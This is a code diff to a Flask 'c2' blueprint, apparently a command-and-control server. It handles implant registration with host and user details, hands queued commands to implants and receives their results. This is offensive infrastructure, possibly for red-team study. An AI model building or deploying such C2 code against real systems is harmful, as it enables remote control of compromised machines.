@@ -1,7 +1,8 @@
 from crypt import methods
 from flask import Blueprint, jsonify, request
 from speedrun.db import db
-from speedrun.models import Implant
+from speedrun.models import Implant, Task 
+
 c2 = Blueprint('c2', __name__)
 
 
@@ -40,14 +41,16 @@ def register_implant_helper(implant_id, username, hostname, os_type, os_name, os
 @c2.route("/implant/register", methods=["POST"])
 def register_implant():
     data = request.get_json()
-    result = register_implant_helper(
-        data.get("implant_id"), 
-        data.get("username"),
-        data.get("hostname"),
-        data.get("os_type"),
-        data.get("os_name"),
-        data.get("os_version")
-    )
+    result = register_implant_helper(**data)
+
+    # result = register_implant_helper(
+    #     data.get("implant_id"), 
+    #     data.get("username"),
+    #     data.get("hostname"),
+    #     data.get("os_type"),
+    #     data.get("os_name"),
+    #     data.get("os_version")
+    # )
     if result:
         return jsonify({"status": True, "message": "welcome!"})
     else:
@@ -56,9 +59,14 @@ def register_implant():
 @c2.route("/implant/task", methods=[ "POST"])
 def handle_implant_task():
     data = request.get_json()
+    results = data.get("results")
+    if results:
+        # TODO: update the database with the reuslts 
+        print("We got results!", results)
     implant_id = data.get("implant_id")
     #Agent.query.filter_by(agent_id=id_).first()
-    tasks = Task.query.filter_by(implant_id = implant_id).all()
-    return jsonif(
+    tasks = list(Task.query.filter_by(implant_id = implant_id).all())
+    return jsonify(
         [{"cmd": i.cmd, "task_id": i.task_id, "args": i.args} for i in tasks]
     )
+
